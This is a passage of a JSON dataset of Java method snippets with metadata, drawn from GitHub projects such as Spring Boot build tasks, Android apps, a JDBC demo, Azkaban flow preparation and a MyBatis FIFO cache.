"setResources", "params": ["FileCollection"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\t\tpublic void setResources(FileCollection resources) {\t\t\tthis.resources = resources;\t\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/buildSrc/src/main/java/org/springframework/boot/build/AsciidoctorConventions.java", "stars": "47572", "class": {"name": "UnzipDocumentationResources", "extends": "DefaultTask", "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "getOutputDir", "params": [], "throws": null, "modifiers": ["public"], "return_type": "File", "snippet": "\t\tpublic File getOutputDir() {\t\t\treturn this.outputDir;\t\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/buildSrc/src/main/java/org/springframework/boot/build/AsciidoctorConventions.java", "stars": "47572", "class": {"name": "UnzipDocumentationResources", "extends": "DefaultTask", "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "setOutputDir", "params": ["File"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\t\tpublic void setOutputDir(File outputDir) {\t\t\tthis.outputDir = outputDir;\t\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/buildSrc/src/main/java/org/springframework/boot/build/AsciidoctorConventions.java", "stars": "47572", "class": {"name": "UnzipDocumentationResources", "extends": "DefaultTask", "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "syncDocumentationResources", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "\t\tvoid syncDocumentationResources() {\t\t\tgetProject().sync((copySpec) -> {\t\t\t\tcopySpec.into(this.outputDir);\t\t\t\tfor (File resource : this.resources) {\t\t\t\t\tcopySpec.from(getProject().zipTree(resource));\t\t\t\t}\t\t\t});\t\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/buildSrc/src/main/java/org/springframework/boot/build/AsciidoctorConventions.java", "stars": "47572", "class": {"name": "UnzipDocumentationResources", "extends": "DefaultTask", "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "getId", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getId() {        return id;    }", "url": "https://raw.githubusercontent.com/pi-181/oop-labs/master/Lab7/src/main/java/com/demkom58/lab7/model/Wood.java", "stars": "2", "class": {"name": "Wood", "extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"method_name": "setId", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setId(int id) {        this.id = id;    }", "url": "https://raw.githubusercontent.com/pi-181/oop-labs/master/Lab7/src/main/java/com/demkom58/lab7/model/Wood.java", "stars": "2", "class": {"name": "Wood", "extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"method_name": "getName", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getName() {        return name;    }", "url": "https://raw.githubusercontent.com/pi-181/oop-labs/master/Lab7/src/main/java/com/demkom58/lab7/model/Wood.java", "stars": "2", "class": {"name": "Wood", "extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"method_name": "setName", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setName(String name) {        this.name = name;    }", "url": "https://raw.githubusercontent.com/pi-181/oop-labs/master/Lab7/src/main/java/com/demkom58/lab7/model/Wood.java", "stars": "2", "class": {"name": "Wood", "extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"method_name": "getDensity", "params": [], "throws": null, "modifiers": ["public"], "return_type": "float", "snippet": "    public float getDensity() {        return density;    }", "url": "https://raw.githubusercontent.com/pi-181/oop-labs/master/Lab7/src/main/java/com/demkom58/lab7/model/Wood.java", "stars": "2", "class": {"name": "Wood", "extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"method_name": "setDensity", "params": ["float"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setDensity(float density) {        this.density = density;    }", "url": "https://raw.githubusercontent.com/pi-181/oop-labs/master/Lab7/src/main/java/com/demkom58/lab7/model/Wood.java", "stars": "2", "class": {"name": "Wood", "extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"method_name": "toString", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String toString() {        return \"Wood{\" +                \"id=\" + id +                \", name='\" + name + '\\'' +                \", destiny=\" + density +                '}';    }", "url": "https://raw.githubusercontent.com/pi-181/oop-labs/master/Lab7/src/main/java/com/demkom58/lab7/model/Wood.java", "stars": "2", "class": {"name": "Wood", "extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"method_name": "equals", "params": ["Object"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean equals(Object o) {        if (this == o) return true;        if (o == null || getClass() != o.getClass()) return false;        Wood wood = (Wood) o;        return id == wood.id &&                Float.compare(wood.density, density) == 0 &&                name.equals(wood.name);    }", "url": "https://raw.githubusercontent.com/pi-181/oop-labs/master/Lab7/src/main/java/com/demkom58/lab7/model/Wood.java", "stars": "2", "class": {"name": "Wood", "extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"method_name": "hashCode", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int hashCode() {        return Objects.hash(id, name, density);    }", "url": "https://raw.githubusercontent.com/pi-181/oop-labs/master/Lab7/src/main/java/com/demkom58/lab7/model/Wood.java", "stars": "2", "class": {"name": "Wood", "extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"method_name": "onCreate", "params": ["Bundle"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void onCreate(Bundle savedInstanceState) {        super.onCreate(savedInstanceState);        setContentView(R.layout.activity_order_payment);    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/ui/activity/otc/OrderPaymentActivity.java", "stars": "1", "class": {"name": "OrderPaymentActivity", "extends": "AppCompatActivity", "implements": null, "modifiers": ["public"]}}, {"method_name": "main", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "\tpublic static void main(String[] args) {\t\tint n;\t\tScanner sc = new Scanner(System.in);\t\tSystem.out.println(\"enter no of rows:\");\t\tn = sc.nextInt();\t\tint k;\t\tfor(int i = 1;i <= n; i++) {\t\t\tk = 0;\t\t\tfor(int j = 1 ;j <= i ; j++) {\t\t\t\twhile(k < n-i) {\t\t\t\t\tSystem.out.print(\" \");\t\t\t\t\tk = k + 1;\t\t\t\t}\t\t\t\tSystem.out.print(\"*\");\t\t\t}\t\t\tSystem.out.print(\"\\n\");\t\t}\t\tsc.close();\t}", "url": "https://raw.githubusercontent.com/likith22/java-programs/master/LeftTriangle.java", "stars": "3", "class": {"name": "LeftTriangle", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "onCreate", "params": ["Bundle"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "\tprotected void onCreate(Bundle savedInstanceState) {\t\tsuper.onCreate(savedInstanceState);\t\tsetListAdapter(new ArrayAdapter<String>(this, android.R.layout.simple_list_item_1, options));\t}", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/pulltorefresh%20and%20dragndrop%20to%20gridview/LauncherActivity/src/com/handmark/pulltorefresh/samples/LauncherActivity.java", "stars": "74", "class": {"name": "LauncherActivity", "extends": "ListActivity", "implements": null, "modifiers": ["public"]}}, {"method_name": "onListItemClick", "params": ["ListView", "View", "int", "long"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "\tprotected void onListItemClick(ListView l, View v, int position, long id) {\t\tIntent intent;\t\tswitch (position) {\t\t\tdefault:\t\t\tcase 0:\t\t\t\tintent = new Intent(this, PullToRefreshListActivity.class);\t\t\t\tbreak;\t\t\tcase 1:\t\t\t\tintent = new Intent(this, PullToRefreshExpandableListActivity.class);\t\t\t\tbreak;\t\t\tcase 2:\t\t\t\tintent = new Intent(this, PullToRefreshGridActivity.class);\t\t\t\tbreak;\t\t\tcase 3:\t\t\t\tintent = new Intent(this, PullToRefreshWebViewActivity.class);\t\t\t\tbreak;\t\t\tcase 4:\t\t\t\tintent = new Intent(this, PullToRefreshScrollViewActivity.class);\t\t\t\tbreak;\t\t\tcase 5:\t\t\t\tintent = new Intent(this, PullToRefreshHorizontalScrollViewActivity.class);\t\t\t\tbreak;\t\t\t\t\t\tcase 8:\t\t\t\tintent = new Intent(this, PullToRefreshWebView2Activity.class);\t\t\t\tbreak;\t\t\tcase 9:\t\t\t\tintent = new Intent(this, PullToRefreshListInViewPagerActivity.class);\t\t\t\tbreak;\t\t}\t\tstartActivity(intent);\t}", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/pulltorefresh%20and%20dragndrop%20to%20gridview/LauncherActivity/src/com/handmark/pulltorefresh/samples/LauncherActivity.java", "stars": "74", "class": {"name": "LauncherActivity", "extends": "ListActivity", "implements": null, "modifiers": ["public"]}}, {"method_name": "main", "params": ["String"], "throws": ["ClassNotFoundException", "SQLException"], "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void main(String[] args) throws ClassNotFoundException, SQLException {        //1.\u5bfc\u5165\u9a71\u52a8jar\u5305        //2.\u6ce8\u518c\u9a71\u52a8        Class.forName(\"com.mysql.cj.jdbc.Driver\");        //3.\u83b7\u53d6\u6570\u636e\u5e93\u8fde\u63a5\u5bf9\u8c61        Connection conn = DriverManager.getConnection(\"jdbc:mysql://localhost:3306/db1\", \"root\", \"\");        //4.\u5b9a\u4e49 sql \u8bed\u53e5        String sql = \"update student set sex = 2\";        //5.\u83b7\u53d6\u6267\u884csql\u7684\u5bf9\u8c61 Statement        Statement stmt = conn.createStatement();        //6.\u6267\u884c sql        int count = stmt.executeUpdate(sql);        //7.\u5904\u7406\u7ed3\u679c        System.out.println(count);        //8.\u91ca\u653e\u8d44\u6e90        stmt.close();        conn.close();    }", "url": "https://raw.githubusercontent.com/chengcheng1021/javaStudy/master/src/jdbc/Demo/JdbcDemo1.java", "stars": "2", "class": {"name": "JdbcDemo1", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "AddString", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void AddString(String str) {        int length = str.length();        byte[] lenBytes = BitConverterUtil.intToBytes(length);        byte[] strBytes = str.getBytes();        byte[] combineBytes = Unpooled.copiedBuffer(lenBytes, strBytes).array();        if (bytes == null) {            bytes = combineBytes;        } else {            bytes = Unpooled.copiedBuffer(bytes, combineBytes).array();        }    }", "url": "https://raw.githubusercontent.com/wangxingman/my_project/master/netty_game_app/netty_game_server/src/main/java/com/game/core/util/ProtocolBytes.java", "stars": "1", "class": {"name": "ProtocolBytes", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "GetString", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String GetString() {        if (bytes == null) {            return \"\";        }        if (bytes.length < start + 4) {            return \"\";        }        // \u83b7\u5f97\u534f\u8bae\u4e2d\u5b57\u7b26\u4e32\u7684\u957f\u5ea6        int strLen = BitConverterUtil.BytesToInt(bytes, start);        if (bytes.length < start + 4 + strLen) {            return \"\";        }        // \u83b7\u5f97\u534f\u8bae\u4e2d\u5177\u4f53\u7684\u5b57\u7b26\u4e32\u7684\u5185\u5bb9        String str = new String(bytes, start + 4, strLen);        // start\u6307\u9488\u524d\u79fb        this.start = start + 4 + strLen;        return str;    }", "url": "https://raw.githubusercontent.com/wangxingman/my_project/master/netty_game_app/netty_game_server/src/main/java/com/game/core/util/ProtocolBytes.java", "stars": "1", "class": {"name": "ProtocolBytes", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getProjectDirCacheHitRatio", "params": [], "throws": null, "modifiers": [], "return_type": "double", "snippet": "  double getProjectDirCacheHitRatio() {    return this.cacheMetrics.getHitRatio();  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/FlowPreparer.java", "stars": "18", "class": {"name": "FlowPreparer", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "calculateDirSizeAndSave", "params": ["File"], "throws": ["IOException"], "modifiers": ["static"], "return_type": "long", "snippet": "  static long calculateDirSizeAndSave(final File dir) throws IOException {    final Path path = Paths.get(dir.getPath(), FlowPreparer.PROJECT_DIR_SIZE_FILE_NAME);    if (!Files.exists(path)) {      final long sizeInByte = FileUtils.sizeOfDirectory(dir);      FileIOUtils.dumpNumberToFile(path, sizeInByte);      return sizeInByte;    } else {      return FileIOUtils.readNumberFromFile(path);    }  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/FlowPreparer.java", "stars": "18", "class": {"name": "FlowPreparer", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "setup", "params": ["ExecutableFlow"], "throws": ["ExecutorManagerException"], "modifiers": [], "return_type": "void", "snippet": "  void setup(final ExecutableFlow flow) throws ExecutorManagerException {    final ProjectFileHandler projectFileHandler = null;    File tempDir = null;    try {      final ProjectDirectoryMetadata project = new ProjectDirectoryMetadata(          flow.getProjectId(),          flow.getVersion());      final long flowPrepStartTime = System.currentTimeMillis();      // Download project to a temp dir if not exists in local cache.      final long start = System.currentTimeMillis();      tempDir = downloadProjectIfNotExists(project, flow.getExecutionId());      log.info(\"Downloading zip file for project {} when preparing execution [execid {}] \"              + \"completed in {} second(s)\", project, flow.getExecutionId(),          (System.currentTimeMillis() - start) / 1000);      // With synchronization, only one thread is allowed to proceed to avoid complicated race      // conditions which could arise when multiple threads are downloading/deleting/hard-linking      // the same project. But it doesn't prevent multiple executor processes interfering with each      // other triggering race conditions. So it's important to operationally make sure that only      // one executor process is setting up flow execution against the shared project directory.      long criticalSectionStartTime = -1;      File execDir = null;      synchronized (this) {        criticalSectionStartTime = System.currentTimeMillis();        if (!project.getInstalledDir().exists() && tempDir != null) {          // If new project is downloaded and project dir cache clean-up feature is enabled, then          // perform clean-up if size of all project dirs exceeds the cache size.          if (this.projectCacheCleaner.isPresent()) {            this.projectCacheCleaner.get()                .deleteProjectDirsIfNecessary(project.getDirSizeInByte());          }          // Rename temp dir to a proper project directory name.          Files.move(tempDir.toPath(), project.getInstalledDir().toPath());        }        execDir = setupExecutionDir(project.getInstalledDir(), flow);      }      final long flowPrepCompletionTime = System.currentTimeMillis();      log.info(\"Flow preparation completed in {} sec(s), out ot which {} sec(s) was spent inside \"              + \"critical section. [execid: {}, path: {}]\",          (flowPrepCompletionTime - flowPrepStartTime) / 1000,          (flowPrepCompletionTime - criticalSectionStartTime) / 1000,          flow.getExecutionId(), execDir.getPath());    } catch (final Exception ex) {      FileIOUtils.deleteDirectorySilently(tempDir);      log.error(\"Error in preparing flow execution {}\", flow.getExecutionId(), ex);      throw new ExecutorManagerException(ex);    } finally {      if (projectFileHandler != null) {        projectFileHandler.deleteLocalFile();      }    }  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/FlowPreparer.java", "stars": "18", "class": {"name": "FlowPreparer", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "setupExecutionDir", "params": ["File", "ExecutableFlow"], "throws": ["IOException"], "modifiers": ["private"], "return_type": "File", "snippet": "  private File setupExecutionDir(final File installedDir, final ExecutableFlow flow)      throws IOException {    File execDir = null;    try {      execDir = createExecDir(flow);      // FIXME\u00a0Cancel the soft connection, copy files directly from the projects directory to the execution directory, the purpose is to achieve the parameter replacement of the run_date variable.      FileUtils.copyDirectory(installedDir, execDir);      return execDir;    } catch (final Exception ex) {      FileIOUtils.deleteDirectorySilently(execDir);      throw ex;    }  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/FlowPreparer.java", "stars": "18", "class": {"name": "FlowPreparer", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "updateLastModifiedTime", "params": ["Path"], "throws": null, "modifiers": [], "return_type": "void", "snippet": "  void updateLastModifiedTime(final Path path) {    try {      Files.setLastModifiedTime(path, FileTime.fromMillis(System.currentTimeMillis()));    } catch (final IOException ex) {      log.warn(\"Error when updating last modified time for {}\", path, ex);    }  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/FlowPreparer.java", "stars": "18", "class": {"name": "FlowPreparer", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "generateProjectDirName", "params": ["ProjectDirectoryMetadata"], "throws": null, "modifiers": ["private"], "return_type": "String", "snippet": "  private String generateProjectDirName(final ProjectDirectoryMetadata proj) {    return String.valueOf(proj.getProjectId()) + \".\" + String.valueOf(proj.getVersion());  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/FlowPreparer.java", "stars": "18", "class": {"name": "FlowPreparer", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "createTempDir", "params": ["ProjectDirectoryMetadata"], "throws": null, "modifiers": ["private"], "return_type": "File", "snippet": "  private File createTempDir(final ProjectDirectoryMetadata proj) {    final String projectDir = generateProjectDirName(proj);    final File tempDir = new File(this.projectCacheDir,        \"_temp.\" + projectDir + \".\" + System.currentTimeMillis());    tempDir.mkdirs();    return tempDir;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/FlowPreparer.java", "stars": "18", "class": {"name": "FlowPreparer", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "downloadAndUnzipProject", "params": ["ProjectDirectoryMetadata", "File"], "throws": ["IOException"], "modifiers": ["private"], "return_type": "void", "snippet": "  private void downloadAndUnzipProject(final ProjectDirectoryMetadata proj, final File dest)      throws IOException {    final ProjectFileHandler projectFileHandler = requireNonNull(this.storageManager        .getProjectFile(proj.getProjectId(), proj.getVersion()));    try {      checkState(\"zip\".equals(projectFileHandler.getFileType()));      final File zipFile = requireNonNull(projectFileHandler.getLocalFile());      final ZipFile zip = new ZipFile(zipFile);      Utils.unzip(zip, dest);      proj.setDirSizeInByte(calculateDirSizeAndSave(dest));    } finally {      projectFileHandler.deleteLocalFile();    }  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/FlowPreparer.java", "stars": "18", "class": {"name": "FlowPreparer", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "downloadProjectIfNotExists", "params": ["ProjectDirectoryMetadata", "int"], "throws": ["IOException"], "modifiers": [], "return_type": "File", "snippet": "  File downloadProjectIfNotExists(final ProjectDirectoryMetadata proj, int execId)      throws IOException {    final String projectDir = generateProjectDirName(proj);    if (proj.getInstalledDir() == null) {      proj.setInstalledDir(new File(this.projectCacheDir, projectDir));    }    // If directory exists, assume it's prepared and skip.    if (proj.getInstalledDir().exists()) {\tlog.info(\"Project {} already cached. Skipping download. ExecId: {}\", proj, execId);      // Hit the local cache.      this.cacheMetrics.incrementCacheHit();      // Update last modified time of the file keeping project dir size when the project is      // accessed. This last modified time will be used to determined least recently used      // projects when performing project directory clean-up.      updateLastModifiedTime(          Paths.get(proj.getInstalledDir().getPath(), PROJECT_DIR_SIZE_FILE_NAME));      return null;    }    this.cacheMetrics.incrementCacheMiss();    final File tempDir = createTempDir(proj);    downloadAndUnzipProject(proj, tempDir);    return tempDir;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/FlowPreparer.java", "stars": "18", "class": {"name": "FlowPreparer", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "createExecDir", "params": ["ExecutableFlow"], "throws": null, "modifiers": ["private"], "return_type": "File", "snippet": "  private File createExecDir(final ExecutableFlow flow) {    final int execId = flow.getExecutionId();    final File execDir = new File(this.executionsDir, String.valueOf(execId));    flow.setExecutionPath(execDir.getPath());    execDir.mkdirs();    return execDir;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/FlowPreparer.java", "stars": "18", "class": {"name": "FlowPreparer", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "getHitRatio", "params": [], "throws": null, "modifiers": ["synchronized"], "return_type": "double", "snippet": "    synchronized double getHitRatio() {      final long total = this.cacheHit + this.cacheMiss;      return total == 0 ? 0 : this.cacheHit * 1.0 / total;    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/FlowPreparer.java", "stars": "18", "class": {"name": "ProjectCacheMetrics", "extends": null, "implements": null, "modifiers": ["static"]}}, {"method_name": "incrementCacheHit", "params": [], "throws": null, "modifiers": ["synchronized"], "return_type": "void", "snippet": "    synchronized void incrementCacheHit() {      this.cacheHit++;    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/FlowPreparer.java", "stars": "18", "class": {"name": "ProjectCacheMetrics", "extends": null, "implements": null, "modifiers": ["static"]}}, {"method_name": "incrementCacheMiss", "params": [], "throws": null, "modifiers": ["synchronized"], "return_type": "void", "snippet": "    synchronized void incrementCacheMiss() {      this.cacheMiss++;    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/FlowPreparer.java", "stars": "18", "class": {"name": "ProjectCacheMetrics", "extends": null, "implements": null, "modifiers": ["static"]}}, {"method_name": "getBootStrapServers", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getBootStrapServers() {        return bootStrapServers;    }", "url": "https://raw.githubusercontent.com/Vondser/mmwms-antd/master/src/main/java/com/meimos/myapp/config/KafkaProperties.java", "stars": "2", "class": {"name": "KafkaProperties", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setBootStrapServers", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setBootStrapServers(String bootStrapServers) {        this.bootStrapServers = bootStrapServers;    }", "url": "https://raw.githubusercontent.com/Vondser/mmwms-antd/master/src/main/java/com/meimos/myapp/config/KafkaProperties.java", "stars": "2", "class": {"name": "KafkaProperties", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getConsumerProps", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Map<String,Object>", "snippet": "    public Map<String, Object> getConsumerProps() {        Map<String, Object> properties = new HashMap<>(this.consumer);        if (!properties.containsKey(\"bootstrap.servers\")) {            properties.put(\"bootstrap.servers\", this.bootStrapServers);        }        return properties;    }", "url": "https://raw.githubusercontent.com/Vondser/mmwms-antd/master/src/main/java/com/meimos/myapp/config/KafkaProperties.java", "stars": "2", "class": {"name": "KafkaProperties", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setConsumer", "params": ["Map<String,String>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setConsumer(Map<String, String> consumer) {        this.consumer = consumer;    }", "url": "https://raw.githubusercontent.com/Vondser/mmwms-antd/master/src/main/java/com/meimos/myapp/config/KafkaProperties.java", "stars": "2", "class": {"name": "KafkaProperties", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getProducerProps", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Map<String,Object>", "snippet": "    public Map<String, Object> getProducerProps() {        Map<String, Object> properties = new HashMap<>(this.producer);        if (!properties.containsKey(\"bootstrap.servers\")) {            properties.put(\"bootstrap.servers\", this.bootStrapServers);        }        return properties;    }", "url": "https://raw.githubusercontent.com/Vondser/mmwms-antd/master/src/main/java/com/meimos/myapp/config/KafkaProperties.java", "stars": "2", "class": {"name": "KafkaProperties", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setProducer", "params": ["Map<String,String>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setProducer(Map<String, String> producer) {        this.producer = producer;    }", "url": "https://raw.githubusercontent.com/Vondser/mmwms-antd/master/src/main/java/com/meimos/myapp/config/KafkaProperties.java", "stars": "2", "class": {"name": "KafkaProperties", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getId", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String getId() {    return delegate.getId();  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/cache/decorators/FifoCache.java", "stars": "15", "class": {"name": "FifoCache", "extends": null, "implements": ["Cache"], "modifiers": ["public"]}}, {"method_name": "getSize", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "  public int getSize() {    return delegate.getSize();  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/cache/decorators/FifoCache.java", "stars": "15", "class": {"name": "FifoCache", "extends": null, "implements": ["Cache"], "modifiers": ["public"]}}, {"method_name": "setSize", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void setSize(int size) {    this.size = size;  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/cache/decorators/FifoCache.java", "stars": "15", "class": {"name": "FifoCache", "extends": null, "implements": ["Cache"], "modifiers": ["public"]}}, {"method_name": "putObject", "params": ["Object", "Object"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void putObject(Object key, Object value) {    cycleKeyList(key);    delegate.putObject(key, value);  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/cache/decorators/FifoCache.java", "stars": "15", "class": {"name": "FifoCache", "extends": null, "implements": ["Cache"], "modifiers": ["public"]}}, {"method_name": "getObject", "params": ["Object"], "throws": null, "modifiers": ["public"], "return_type": "Object", "snippet": "  public Object getObject(Object key) {    return delegate.getObject(key);  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/cache/decorators/FifoCache.java", "stars": "15", "class": {"name": "FifoCache", "extends": null, "implements": ["Cache"], "modifiers": ["public"]}}, {"method_name": "removeObject", "params": ["Object"], "throws": null, "modifiers": ["public"], "return_type": "Object", "snippet": "  public Object removeObject(Object key) {    return delegate.removeObject(key);  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/cache/decorators/FifoCache.java", "stars": "15", "class": {"name": "FifoCache", "extends": null, "implements": ["Cache"], "modifiers": ["public"]}}, {"method_name": "clear", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void clear() {    delegate.clear();    keyList.clear();  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/cache/decorators/FifoCache.java", "stars": "15", "class": {"name": "FifoCache", "extends": null, "implements": ["Cache"], "modifiers": ["public"]}}, {"method_name": "cycleKeyList", "params": ["Object"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void cycleKeyList(Object key) {    keyList.addLast(key);    if (keyList.size() > size) {      Object oldestKey = keyList.removeFirst();      delegate.removeObject(oldestKey);    }  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/cache/decorators/FifoCache.java", "stars": "15", "class": {"name": "FifoCache", "extends": null, "implements": ["Cache"], "modifiers": ["public"]}}, {"method_name": "setMessage", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "Builder", "snippet": "        public Builder setMessage(@StringRes int id) {            return setMessage(getString(id));        }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/ui/dialog/MessageDialog.java", "stars": "1", "class": {"name": "Builder", "extends": "UIDialog", "implements": null, "modifiers": ["public", "final", "static"]}}, {"method_name": "setMessage", "params": ["CharSequence"], "throws": null, "modifiers": ["public"], "return_type": "Builder", "snippet": "        public Builder setMessage(CharSequence text) {            mMessageView.setText(text);            return this;        }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/ui/dialog/MessageDialog.java", "stars": "1", "class": {"name": "Builder", "extends": "UIDialog", "implements": null, "modifiers": ["public", "final", "static"]}}, {"method_name": "setListener", "params": ["OnListener"], "throws": null, "modifiers": ["public"], "return_type": "Builder", "snippet": "        public Builder setListener(OnListener listener) {            mListener = listener;            return this;        }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/ui/dialog/MessageDialog.java", "stars": "1", "class": {"name": "Builder", "extends": "UIDialog", "implements": null, "modifiers": ["public", "final", "static"]}}, {"method_name": "create", "params": [], "throws": null, "modifiers": ["public"], "return_type": "BaseDialog", "snippet": "        public BaseDialog create() {            // \u5982\u679c\u5185\u5bb9\u4e3a\u7a7a\u5c31\u629b\u51fa\u5f02\u5e38            if (\"\".equals(mMessageView.getText().toString())) {                throw new IllegalArgumentException(\"Dialog message not null\");            }            return super.create();        }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/ui/dialog/MessageDialog.java", "stars": "1", "class": {"name": "Builder", "extends": "UIDialog", "implements": null, "modifiers": ["public", "final", "static"]}}, {"method_name": "onClick", "params": ["View"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void onClick(View v) {            switch (v.getId()) {                case R.id.tv_ui_confirm:                    autoDismiss();                    if (mListener != null) {                        mListener.onConfirm(getDialog());                    }                    break;                case R.id.tv_ui_cancel:                    autoDismiss();                    if (mListener != null) {                        mListener.onCancel(getDialog());                    }                    break;                default:                    break;            }        }", "url": 